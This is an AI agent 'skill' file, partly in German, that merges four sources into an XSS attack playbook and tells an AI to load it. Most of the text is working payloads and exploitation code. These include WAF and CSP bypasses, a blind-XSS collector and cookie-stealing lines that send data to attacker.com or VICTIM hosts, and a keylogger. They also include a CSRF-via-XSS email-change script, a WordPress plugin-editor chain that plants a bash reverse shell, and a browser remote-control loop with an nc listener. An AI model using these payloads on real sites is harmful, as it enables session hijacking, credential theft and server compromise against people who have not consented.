---
name: xss
description: "XSS playbook. Use when user-controlled content reaches HTML, attributes, JavaScript, DOM sinks, uploads, or multi-context rendering paths."
domain: web-injection
merged: true
merged_from: [hack-skills:xss-cross-site-scripting, hacking-skills:dom-xss, hacking-skills:xss-reflected, hacking-skills:xss-stored]
---

# xss

> **Fusionierter Skill** — vereint 4 Quell-Skills zu einem: `hack-skills:xss-cross-site-scripting`, `hacking-skills:dom-xss`, `hacking-skills:xss-reflected`, `hacking-skills:xss-stored`. Alle Techniken aller Quellen sind unten zusammengeführt, nichts ausgelassen.

## Quelle: hack-skills — xss-cross-site-scripting (380 Zeilen)

# SKILL: Cross-Site Scripting (XSS) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: This skill covers non-obvious XSS techniques, context-specific payload selection, WAF bypass, CSP bypass, and post-exploitation. Assume the reader already knows `<script>alert(1)</script>` — this file only covers what base models typically miss. For real-world CVE cases, HttpOnly bypass strategies, XS-Leaks side channels, and session fixation attacks, load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. RELATED ROUTING

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- Django debug page XSS (CVE-2017-12794) — duplicate key error → unescaped exception → XSS
- UTF-7 XSS for legacy IE environments (`+ADw-script+AD4-`)
- HttpOnly bypass methodology — proxy-the-browser, session riding, CSRF-via-XSS
- XS-Leaks side channel attacks — timing oracle, cache probing, `performance.now()` measurement
- Session fixation via XSS — pre-set session ID before victim login
- DOM clobbering techniques for CSP-restricted environments

### Advanced Tricks

Also load [ADVANCED_XSS_TRICKS.md](./ADVANCED_XSS_TRICKS.md) when you need:
- mXSS / DOMPurify bypass — namespace confusion, `<noscript>` parsing differential, form/table restructuring
- DOM Clobbering — property override via `id`/`name`, HTMLCollection, deep property chains
- Modern framework XSS — React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `bypassSecurityTrust*`, Next.js SSR
- Trusted Types bypass — default policy abuse, non-TT sinks, policy passthrough
- Service Worker XSS persistence — malicious SW registration, fetch interception, post-patch survival
- PDF/SVG/MathML XSS vectors, polyglot payloads, browser-specific tricks
- XS-Leaks & side channels — timing oracle, frame counting, cache probing, error event oracle

Before broad payload spraying, you can first load:

- [upload insecure files](../upload-insecure-files/SKILL.md) when you need the full upload path: validation, storage, preview, and sharing behavior

### Quick context picks

| Context | First Pick | Backup |
|---|---|---|
| HTML body | `<svg onload=alert(1)>` | `<img src=1 onerror=alert(1)>` |
| Quoted attribute | `" autofocus onfocus=alert(1)//` | `" onmouseover=alert(1)//` |
| JavaScript string | `'-alert(1)-'` | `'</script><svg onload=alert(1)>` |
| URL / href sink | `javascript:alert(1)` | `data:text/html,<svg onload=alert(1)>` |
| Tag body like `title` | `</title><svg onload=alert(1)>` | `</textarea><svg onload=alert(1)>` |
| SVG / XML sink | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>` | XHTML namespace payload |

```html
<svg onload=alert(1)>
<img src=1 onerror=alert(1)>
" autofocus onfocus=alert(1)//
'</script><svg onload=alert(1)>
javascript:alert(1)
data:text/html,<svg onload=alert(1)>
```

---

## 1. INJECTION CONTEXT MATRIX

Identify context **before** picking a payload. Wrong context = wasted attempts.

| Context | Indicator | Opener | Payload |
|---|---|---|---|
| HTML outside tag | `<b>INPUT</b>` | `<svg onload=` | `<svg onload=alert(1)>` |
| HTML attribute value | `value="INPUT"` | `"` close attr | `"onmouseover=alert(1)//` |
| Inline attr, no tag close | Quoted, `>` stripped | Event injection | `"autofocus onfocus=alert(1)//` |
| Block tag (title/script/textarea) | `<title>INPUT</title>` | Close tag first | `</title><svg onload=alert(1)>` |
| href / src / data / action | link or form | Protocol | `javascript:alert(1)` |
| JS string (single quote) | `var x='INPUT'` | Break string | `'-alert(1)-'` or `'-alert(1)//` |
| JS string with escape | Backslash escaping | Double escape | `\'-alert(1)//` |
| JS logical block | Inside if/function | Close + inject | `'}alert(1);{'` |
| JS anywhere on page | `<script>...INPUT` | Break script | `</script><svg onload=alert(1)>` |
| XML page (`text/xml`) | XML content-type | XML namespace | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>` |

---

## 2. MULTI-REFLECTION ATTACKS

When input reflects in **multiple places** on the same page — single payload triggers from all points:

```html
<!-- Double reflection -->
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*

<!-- Triple reflection -->
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='

<!-- Two separate inputs (p= and q=) -->
p=<svg/1='&q='onload=alert(1)>
```

---

## 3. ADVANCED INJECTION VECTORS

### DOM Insert Injection (when reflection is in DOM not source)
Input inserted via `.innerHTML`, `document.write`, jQuery `.html()`:
```html
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
```
For URL-controlled resource insertion:
```html
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
```

### PHP_SELF Path Injection
When URL itself is reflected in form `action`:
```
https://target.com/page.php/"><svg onload=alert(1)>?param=val
```
Inject between `.php` and `?`, using leading `/`.

### File Upload XSS

**Filename injection** (when filename is reflected):
```
"><svg onload=alert(1)>.gif
```

**SVG upload** (stored XSS via image upload accepting SVG):
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

**Metadata injection** (when EXIF is reflected):
```bash
exiftool -Artist='"><svg onload=alert(1)>' photo.jpeg
```

### postMessage XSS (no origin check)
When page has `window.addEventListener('message', ...)` without origin validation:
```html
<iframe src="TARGET_URL" onload="frames[0].postMessage('INJECTION','*')">
```

### postMessage Origin Bypass
When origin IS checked but uses `.includes()` or prefix match:
```
http://facebook.com.ATTACKER.com/crosspwn.php?target=//victim.com/page&msg=<script>alert(1)</script>
```
Attacker controls `facebook.com.ATTACKER.com` subdomain.

### XML-Based XSS
Response has `text/xml` or `application/xml`:
```html
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//attacker.com/1.js"/>
```

### Script Injection Without Closing Tag
When there IS a `</script>` tag later in the page:
```html
<script src=data:,alert(1)>
<script src=//attacker.com/1.js>
```

---

## 4. CSP BYPASS TECHNIQUES

### JSONP Endpoint Bypass (allow-listed domain has JSONP)
```html
<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1);">
</script>
```

### AngularJS CDN Bypass (allow-listed `ajax.googleapis.com`)
```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<x ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</x>
```

### Angular Expressions (server encodes HTML but AngularJS evaluates)
When `{{1+1}}` evaluates to `2` on page — classic CSTI indicator:
```javascript
// Angular 1.x sandbox escape:
{{constructor.constructor('alert(1)')()}}

// Angular 1.5.x:
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

### base-uri Injection (CSP without base-uri restriction)
```html
<base href="https://attacker.com/">
```
Relative `<script src=...>` loads from attacker's server.

### DOM-based via Dangling Markup
When CSP blocks script but allows `img`:
```html
<img src='https://attacker.com/log?
```
Leaks subsequent page content to attacker.

---

## 5. FILTER AND WAF BYPASS

### Parameter Name Attack (WAF checks value not name)
When parameter names are reflected (e.g., in JSON output):
```
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```
Payload is the **parameter name**, not value.

### Encoding Chains
```
%253C  → double-encoded <
%26lt; → HTML entity double-encoding
<%00h2 → null byte injection
%0d%0a → CRLF inside tag
```
Test sequence: reflect → encoding behavior → identify filter logic → mutate.

### Tag Mutation (blacklist bypass)
```html
<ScRipt>  ← case variation
</script/x>  ← trailing garbage
<script  ← incomplete (relies on later >)
<%00iframe  ← null byte
<svg/onload=  ← slash instead of space
```

### Fragmented Injection (strip-tags bypass)
Filter strips `<x>...</x>`:
```
"o<x>nmouseover=alert<x>(1)//
"autof<x>ocus o<x>nfocus=alert<x>(1)//
```

### Vectors Without Event Handlers
```html
<form action=javascript:alert(1)><input type=submit>
<form><button formaction=javascript:alert(1)>click
<isindex action=javascript:alert(1) type=submit value=click>
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
<math><brute href=javascript:alert(1)>click
```

---

## 6. SECOND-ORDER XSS

**Definition**: Input is stored (often normalized/HTML-encoded), then later **retrieved** and inserted into DOM without re-encoding.

**Classic trigger payload** (bypasses immediate HTML encoding):
```
&lt;svg/onload&equals;alert(1)&gt;
```
Check: profile fields, display names, forum posts — anywhere data is stored, then re-rendered in a different context (e.g., admin panel vs user-facing).

**Stored → Admin context XSS**: most impactful — sign up with crafted username, wait for admin to view user list.

---

## 7. BLIND XSS METHODOLOGY

Every parameter that is **not immediately reflected** should be tested for blind XSS:
- Contact forms, feedback fields
- User-agent / referer  
- Registration fields
- Error log injections

**Blind XSS callback payload** (remote JS file approach):
```html
"><script src=//attacker.com/bxss.js></script>
```

**Minimal collector** (hosted at `bxss.js`):
```javascript
var d = document;
var msg = 'URL: '+d.URL+'\nCOOKIE: '+d.cookie+'\nDOM:\n'+d.documentElement.innerHTML;
fetch('https://attacker.com/collect?'+encodeURIComponent(msg));
```

Use **XSS Hunter** or similar blind XSS platform for automated collection.

---

## 8. XSS EXPLOITATION CHAIN

### Cookie Steal
```javascript
fetch('//attacker.com/?c='+document.cookie)
// HttpOnly protected cookies → not stealable via JS, need CSRF or session fixation instead
```

### Keylogger
```javascript
document.onkeypress = function(e) {
    fetch('//attacker.com/k?k='+encodeURIComponent(e.key));
}
```

### CSRF via XSS (bypasses CSRF protection, reads CSRF token from DOM)
```javascript
var r = new XMLHttpRequest();
r.open('GET', '/account/settings', false);
r.send();
var token = /csrf_token['":\s]+([^'"<\s]+)/.exec(r.responseText)[1];
var f = new XMLHttpRequest();
f.open('POST', '/account/email/change', true);
f.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
f.send('email=attacker@evil.com&csrf='+token);
```

### WordPress XSS → RCE (admin session + Hello Dolly plugin):
```javascript
p = '/wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?=`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`;?>';
a = new XMLHttpRequest();
a.open('GET', p+q, 0); a.send();
$ = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
    '&newcontent=' + encodeURIComponent(s) + '&action=update&' + q;
b = new XMLHttpRequest();
b.open('POST', p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send($);
b.onreadystatechange = function(){ if(this.readyState==4) fetch('/wp-content/plugins/hello.php'); }
```

### Browser Remote Control (JS command shell)
```javascript
// Injected into victim:
setInterval(function(){
    with(document)body.appendChild(createElement('script')).src='//ATTACKER:5855'
},100)
```
```bash
# Attacker listener:
while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
```

---

## 9. DECISION TREE

```
Test XSS entry point
├── Input reflected in response?
│   ├── YES → Identify context (HTML / JS / attr / URL)
│   │         → Select context-appropriate payload
│   │         → If blocked → check filter behavior
│   │         │   → Try encoding, case mutation, fragmentation
│   │         │   → Check if parameter NAME is reflected (WAF gap)
│   │         └── Success → escalate (cookie steal / CSRF / RCE)
│   └── NO  → Is it stored? → Inject blind XSS payload
│             Is it in DOM? → Check JS source for unsafe sinks
│                             (innerHTML, eval, document.write, location.href)
└── CSP present?
    ├── Check for JSONP endpoints on allow-listed domains
    ├── Check for AngularJS on CDN allow-list
    ├── Check for base-uri missing → <base> injection
    └── Check for unsafe-eval or unsafe-inline exceptions
```

---

## 10. XSS TESTING PROCESS (ZSEANO METHOD)

1. **Step 1** — Test non-malicious tags: `<h2>`, `<img>`, `<table>` — are they reflected raw?
2. **Step 2** — Test incomplete tags: `<iframe src=//attacker.com/c=` (no closing `>`) 
3. **Step 3** — Encoding probes: `<%00h2`, `%0d`, `%0a`, `%09`, `%253C`  
4. **Step 4** — If filtering `<script>` and `onerror` but NOT `<script ` (without close): `<script src=//attacker.com?c=`
5. **Step 5** — Blacklist check: does `<svg>` work? Does `<ScRiPt>` work?
6. Note: **the same filter likely exists elsewhere** — if they filter `<script>` in search, do they filter it in file upload filename? In profile bio?

**Key insight**: Filter presence = vulnerability exists, developer tried to patch. Chase that thread across the entire application.

## Quelle: hacking-skills — dom-xss (126 Zeilen)

# DOM-Based Cross-Site Scripting (XSS)

## What Is Broken and Why
DOM XSS arises when client-side JavaScript takes data from a controllable source (URL fragment, query string, referrer, postMessage, cookie) and writes it to a dangerous sink that interprets HTML or executes code, all without the data ever being sent to or processed by the server. This means server-side output encoding does not prevent it, and proxy-based scanners may miss it entirely. The root cause is JavaScript treating user-controlled DOM properties as trusted content.

## Key Signals
- JavaScript reading from: `location.hash`, `location.search`, `location.href`, `document.referrer`, `window.name`, `document.cookie`, `postMessage` event data
- JavaScript writing to: `document.write()`, `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `eval()`, `setTimeout(string)`, `setInterval(string)`, `location.href = ...`, `src` attribute assignment, `jQuery.html()`, `jQuery.append()`
- Single-page applications (SPAs) with client-side routing
- JavaScript dynamically building page content from URL parameters
- Event handler attributes set from JavaScript using string-based eval-equivalent constructs

## Methodology
1. Crawl the application and collect all JavaScript files, inline scripts, and event handlers.
2. Search for DOM source references: `location.hash`, `location.search`, `document.referrer`, `window.name`.
3. Trace data flow from each source to identify all sinks it reaches.
4. Identify the context in which the sink operates (HTML, JavaScript, URL, CSS).
5. Craft a context-appropriate payload and deliver via the controllable source.
6. Test in a real browser — automated tools miss browser-behavior-dependent execution.
7. Pay attention to: script execution in event handlers, off-site CSS/script includes, SPA route handling.

## Payloads & Tools
```
# Fragment-based DOM XSS (payload never sent to server)
TARGET/page#<script>alert(1)</script>
TARGET/page#<img src=x onerror=alert(document.cookie)>

# Hash-based with document.write sink
# Vulnerable code: document.write("Location: " + document.location.href)
TARGET/page#<script>alert(1)</script>

# innerHTML sink via URL parameter
# Vulnerable code: document.getElementById('x').innerHTML = location.hash.substring(1)
TARGET/page#<img src=x onerror=alert(1)>

# eval() sink
# Vulnerable code: eval('var x = "' + location.hash.substring(1) + '"')
TARGET/page#"; alert(1); var y="

# location.href sink (open redirect + XSS)
# Vulnerable code: window.location = decodeURIComponent(location.hash.substring(1))
TARGET/page#javascript:alert(document.cookie)

# jQuery .html() sink
TARGET/page?search=<img src=x onerror=alert(1)>

# document.write with script src
TARGET/page?lang=<script src=//VICTIM/xss.js>

# window.name trick (survives navigation)
# Attacker page sets: window.name = "<img src=x onerror=alert(1)>"
# Victim app reads: document.getElementById('x').innerHTML = window.name

# postMessage XSS
# Attacker sends: targetWindow.postMessage("<img src=x onerror=alert(1)>", "*")
# Victim app: window.addEventListener("message", (e) => { div.innerHTML = e.data; })

# Burp DOM Invader
# Enable in Burp's embedded browser -> Extensions -> DOM Invader
# Automatically injects canary into all sources and monitors sinks

# Manual Chrome DevTools approach
# Sources tab: search all JS for: innerHTML, document.write, eval, location
# Console: monitor with: Object.defineProperty(document, 'cookie', {get: () => {debugger; return ''}})
```

## Bypass Techniques
- Fragment (`#`) payloads are not sent to server, bypassing server-side WAFs and filters
- `javascript:` URI scheme in href/src sinks when `<script>` tags are filtered
- Event handlers in injected HTML: `<img onerror=...>`, `<svg onload=...>`, `<body onpageshow=...>`
- `innerHTML` does not execute `<script>` tags directly — use event handler payloads instead
- Encoding in fragment: `%3Cscript%3E` may be decoded by `decodeURIComponent()` before reaching sink
- `window.name` persists across cross-origin navigations — attacker page can set it
- `postMessage` with missing or weak origin validation (see web messaging skill)
- Template literal injection in modern JS: `eval(\`${userInput}\`)`

## Exploitation Scenarios
**Scenario 1 — Fragment Injection via document.write**
Setup: SPA reads `location.hash` to display a "you came from" breadcrumb using `document.write()`.
Trigger: Victim clicks attacker link: `TARGET/dashboard#<script>new Image().src='http://VICTIM/c?x='+document.cookie</script>`
Impact: Session cookie exfiltrated to attacker; payload never touches server, bypasses WAF.

**Scenario 2 — eval() Injection via Search Parameter**
Setup: JavaScript parses `location.search` and uses `eval()` to set a variable from the `theme` parameter.
Trigger: `TARGET/page?theme=dark";fetch('http://VICTIM/?c='+document.cookie);//`
Impact: Arbitrary JavaScript executed; session stolen.

**Scenario 3 — innerHTML Sink via jQuery**
Setup: jQuery-based page loads product description from `#description` fragment into `$('#content').html()`.
Trigger: `TARGET/product#<img src=x onerror="document.location='http://VICTIM/steal?c='+document.cookie">`
Impact: Cookie exfiltration; attacker can perform any action as the victim user.

## False Positives
- Payload in fragment reflected in source but not reaching a dangerous sink (rendered as text only)
- `innerHTML` assigned a value that is HTML-encoded before assignment (escaping happening in JS)
- DOMPurify or similar sanitizer stripping dangerous content before sink assignment
- CSP blocking inline script execution even when payload reaches sink
- `eval()` present in code but receiving only developer-controlled or whitelisted input

## Fix Patterns
- Use `textContent` or `innerText` instead of `innerHTML` when inserting user-controlled data as plain text
- When HTML insertion is required, sanitize with DOMPurify: `element.innerHTML = DOMPurify.sanitize(userInput)`
- Avoid `eval()`, `setTimeout(string)`, `setInterval(string)` with user-controlled data
- Validate and sanitize `postMessage` event data; always check `event.origin` before processing
- For URL redirects: use an allowlist of permitted destinations; never pass `javascript:` to `location.href`
- Content Security Policy: `script-src 'self'` prevents execution of injected scripts
- Use frameworks with auto-escaping (React, Angular) which avoid direct DOM manipulation by default

## Related Skills

DOM XSS is a distinct exploit path from [[xss-reflected]] and [[xss-stored]] because the payload never reaches the server — a purely client-side taint flow. [[cspt]] frequently lands in a DOM XSS sink: a path traversal that redirects a `fetch()` to an attacker-controlled URL can return a payload that gets written to `innerHTML`. A [[cors-misconfig]] that lets cross-origin reads succeed enables exfiltrating data from DOM XSS contexts by relaying the stolen content through the attacker's domain.

## Quelle: hacking-skills — xss-reflected (126 Zeilen)

# Reflected Cross-Site Scripting (XSS)

## What Is Broken and Why
Reflected XSS occurs when an application takes user-supplied data (URL parameters, form fields, HTTP headers) and includes it in the HTTP response without proper output encoding. The browser interprets the injected content as executable script, running in the context of the vulnerable origin. Because the payload travels in the request, the attacker must socially-engineer the victim into clicking a crafted link. The root cause is missing context-aware output encoding.

## Key Signals
- Input parameter value appears verbatim in the HTML response source
- Special characters `<`, `>`, `"`, `'`, `&` are not HTML-encoded in responses
- JavaScript context: input reflected inside `<script>` blocks or event handlers without escaping `'`, `"`, `\`
- Error messages or page titles echoing raw query strings
- HTTP headers (User-Agent, Referer) reflected in error pages

## Methodology
1. Map all input vectors: URL parameters, POST body fields, hidden form fields, HTTP headers, cookie values.
2. Submit a canary string (e.g., `xss12345`) and search the response for its unencoded presence.
3. Identify the HTML context of the reflection: tag body, attribute, script block, URL, CSS.
4. Craft a context-appropriate payload:
   - Tag body: `<script>alert(1)</script>`
   - Attribute: `" onfocus="alert(1)` or `" onmouseover="alert(1)`
   - Script block: `';alert(1)//`
   - URL context: `javascript:alert(1)`
5. Test filter bypass variants if initial payloads are blocked.
6. Verify execution in a real browser (not just source inspection).
7. Escalate to cookie theft, credential harvesting, or redirect payloads.

## Payloads & Tools
```
# Basic tag-body injection
TARGET/page?user=<script>alert(1)</script>

# Attribute context break-out
TARGET/page?user="><script>alert(document.cookie)</script>
TARGET/page?user=" onfocus="alert(1)" autofocus="

# Script block context
TARGET/page?user=';alert(document.cookie)//

# Cookie exfiltration
TARGET/page?user=<script>document.location='http://VICTIM/steal?c='+document.cookie</script>

# Link manipulation via onload
TARGET/page?user=<script>window.onload=function(){var a=document.getElementsByTagName('a');a[0].href='http://VICTIM/malicious';}</script>

# Filter bypass: case variation
TARGET/page?user="><ScRiPt>alert(1)</ScRiPt>

# Filter bypass: space in tag
TARGET/page?user="><script >alert(1)</script >

# Filter bypass: URL encoding
TARGET/page?user=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E

# Filter bypass: double-encoded
TARGET/page?user=%2522%253E%253Cscript%253Ealert(1)%253C%252Fscript%253E

# Filter bypass: non-recursive filter
TARGET/page?user=<scr<script>ipt>alert(1)</script>

# HTTP Parameter Pollution
TARGET/page?param=<script&param=>alert(1)</&param=script>

# Burp Suite Intruder with XSS payloads wordlist
# Load: Intruder -> Payloads -> Load fuzz-XSS.txt from SecLists
```

## Bypass Techniques
- Case variation: `<ScRiPt>`, `<SCRIPT>`
- Space insertion in tags: `<script >`, `< script>`
- URL encoding: `%3C`, `%3E`, `%22`
- Double URL encoding: `%253C`
- HTML entity encoding in attribute context: `&lt;`, `&#60;`, `&#x3c;`
- Null bytes: `<%00script>`
- Tab/newline insertion: `<scr\tipt>`, `<scr\nipt>`
- Alternative event handlers: `onerror`, `onload`, `onmouseover`, `onfocus`, `autofocus`
- SVG vectors: `<svg onload=alert(1)>`
- IMG fallback: `<img src=x onerror=alert(1)>`
- Regex bypass for script-src filters: `<SCRIPT%20a=">"%20SRC="http://VICTIM/xss.js"></SCRIPT>`
- HTTP Parameter Pollution to split tag across params

## Exploitation Scenarios
**Scenario 1 — Session Hijacking**
Setup: Search results page reflects `q=` parameter in page title without encoding.
Trigger: Attacker sends victim link: `TARGET/search?q=<script>new Image().src='http://VICTIM/c?x='+document.cookie</script>`
Impact: Session cookie transmitted to attacker; full account takeover.

**Scenario 2 — Credential Harvesting via Page Modification**
Setup: Login page `redirect` parameter reflected in a JavaScript string.
Trigger: `TARGET/login?redirect=';document.forms[0].action='http://VICTIM/capture';//` — form submission redirected to attacker.
Impact: Plaintext credentials exfiltrated on login.

**Scenario 3 — Malware Distribution**
Setup: Error page reflects filename parameter in body without encoding.
Trigger: `TARGET/download?file=<script>window.onload=function(){var a=document.getElementsByTagName('a');a[0].href='http://VICTIM/malware.exe';}</script>`
Impact: Victim downloads malware when clicking any link on the page.

## False Positives
- HTML encoding happening after source inspection — verify payload executes in browser, not just that it appears in source
- Framework escaping that happens at render time not visible in raw HTTP response
- CSP blocking execution even when payload is reflected
- Canary string present in HTML comments (no execution context)

## Fix Patterns
- Context-aware output encoding: HTML-encode in tag body, attribute-encode in attributes, JS-encode in script blocks
- Content Security Policy header: `Content-Security-Policy: default-src 'self'; script-src 'self'`
- `X-XSS-Protection: 1; mode=block` (legacy browsers)
- Avoid reflecting untrusted input into script blocks or event handlers
- Use trusted templating engines with auto-escaping enabled by default

## Related Skills

When the injection point persists server-side, escalate to [[xss-stored]] for higher-impact payloads that don't require victim interaction. If the sink is in JavaScript code reading from `location.hash` or `document.referrer`, treat as [[dom-xss]] and look for dangerous sinks like `innerHTML` or `eval`. Reflected XSS can be used to bypass SameSite and execute [[csrf]] on the same origin, since the browser delivers both the XSS and the CSRF forged request from the target origin itself. Filter bypass encoding tricks used here also apply to [[cmd-injection]] when both share the same input sanitization layer.

## Quelle: hacking-skills — xss-stored (115 Zeilen)

# Stored Cross-Site Scripting (XSS)

## What Is Broken and Why
Stored XSS persists because user-supplied content is saved to a database or file system and later retrieved and rendered without output encoding. Unlike reflected XSS, no social engineering link is needed — every user who views the affected page triggers the payload. High-privilege pages (admin panels, audit logs, user management) that display stored user input are particularly dangerous as they can lead to full application compromise.

## Key Signals
- User-controlled fields stored and redisplayed: names, bios, comments, addresses, file names
- Email fields, address fields, or free-text inputs that appear elsewhere in the UI
- Admin panels or logs that display raw user-submitted data
- File upload features that reflect filename or metadata in the browser
- Shopping cart items, support ticket content, or CMS posts rendered to other users
- Source variables: PHP `$_GET`, `$_POST`, `$_REQUEST`, `$_FILES`; ASP `Request.QueryString`, `Request.Form`; JSP `request.getParameter`, `doGet`, `doPost`

## Methodology
1. Map all storage points: forms, API endpoints, file uploads, profile settings.
2. Submit a canary string (e.g., `storedxss1234`) to each storage point.
3. Visit every page where the stored data is rendered (profile view, admin panel, logs, reports).
4. Search response for unencoded canary; determine HTML context.
5. Submit a context-appropriate XSS payload.
6. View the rendering page in a real browser to confirm execution.
7. Test second-order sinks: exported CSV/Excel, PDF reports, admin notifications, email templates.
8. Test via proxy to bypass client-side validation (disable JS or intercept request).
9. Escalate: hook with BeEF, exfiltrate session cookies, perform actions as victim.

## Payloads & Tools
```
# Basic stored payload (comment/bio field)
<script>alert(document.cookie)</script>

# Cookie exfiltration to attacker server
<script>new Image().src='http://VICTIM/steal?c='+encodeURIComponent(document.cookie)</script>

# BeEF hook injection (replace TOKEN with actual BeEF hook URL path)
<script src="http://VICTIM/hook.js"></script>

# Email field injection (URL-encoded for proxy submission)
TARGET-EMAIL%40domain.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E

# File upload XSS via Content-Type manipulation
# Send multipart upload with:
Content-Disposition: form-data; name="uploadfile1"; filename="test.gif"
Content-Type: text/html

<script>alert(document.cookie)</script>

# SVG file upload XSS
# Upload file named payload.svg:
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>

# Bypass client-side validation with Burp:
# 1. Submit valid data in browser
# 2. Intercept with Burp, modify payload in the request body
# 3. Forward modified request

# Confirm server-side storage:
curl -s -b "SESSION=TOKEN" TARGET/profile | grep -i "storedxss1234"
```

## Bypass Techniques
- Intercept and modify requests with Burp/ZAP to bypass client-side input length limits and regex filters
- Use alternate script tags: `<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`, `<body onload=alert(1)>`
- URL-encoded submission when server reads raw URL-decoded values
- Exploit second-order rendering: submit safe text that becomes executable when processed (e.g., Markdown `[text](javascript:alert(1))`)
- File upload: rename `.html` or `.svg` files to allowed extensions if MIME validation is absent server-side
- Strip filter evasion: `<sc<script>ript>alert(1)</sc</script>ript>`
- Polyglot payloads for multiple contexts simultaneously

## Exploitation Scenarios
**Scenario 1 — Admin Panel Compromise via Comment**
Setup: Blog comment field stored and displayed in admin moderation panel without encoding.
Trigger: Attacker posts comment: `<script>document.location='http://VICTIM/steal?c='+document.cookie</script>`
Impact: Admin cookie stolen when moderating; attacker gains admin session.

**Scenario 2 — Mass User Compromise via Profile Bio**
Setup: User profile bio rendered on every page the user visits and on follower feeds.
Trigger: Attacker sets bio to `<script>new Image().src='http://VICTIM/c?x='+document.cookie</script>`
Impact: Every user who views attacker's profile loses their session cookie.

**Scenario 3 — File Upload XSS Leading to Phishing**
Setup: Profile picture upload stores filename in database; filename displayed in image alt text without encoding.
Trigger: Upload file named `"><img src=x onerror="document.body.innerHTML='<form action=http://VICTIM/phish>...'">`.gif
Impact: Login form replaced with attacker-controlled phishing form for all profile viewers.

## False Positives
- Stored content that is HTML-encoded at display time (verify execution in browser, not just source)
- Stored payloads inside HTML comments with no execution path
- Fields stored but only ever returned to the same authenticated user (self-XSS; limited impact without chaining)
- Server-side sanitization that strips tags but leaves canary text intact

## Fix Patterns
- Output encode all stored user data at render time using context-appropriate encoding (HTML, JS, CSS, URL)
- Validate and sanitize on input as defense-in-depth (allowlist over blocklist)
- For rich text: use a dedicated HTML sanitization library (e.g., DOMPurify), never raw innerHTML
- For file uploads: validate MIME type server-side, rename files to random names, serve from a separate origin
- Content Security Policy: `script-src 'self'` prevents inline and external script injection
- Restrict admin/log pages from rendering raw user-submitted data

## Related Skills

Stored XSS delivers a persistent payload that [[xss-reflected]] cannot achieve without a victim clicking a crafted link. It chains naturally into [[csrf]]: a stored payload can extract CSRF tokens or submit forged requests on behalf of every user who views the affected page, making account takeover fully automated. A session cookie exposed via stored XSS is the target of [[cookie-attacks]] — ensure `HttpOnly` is the defense. If the stored content is rendered in a JS template, the [[dom-xss]] sink analysis also applies.
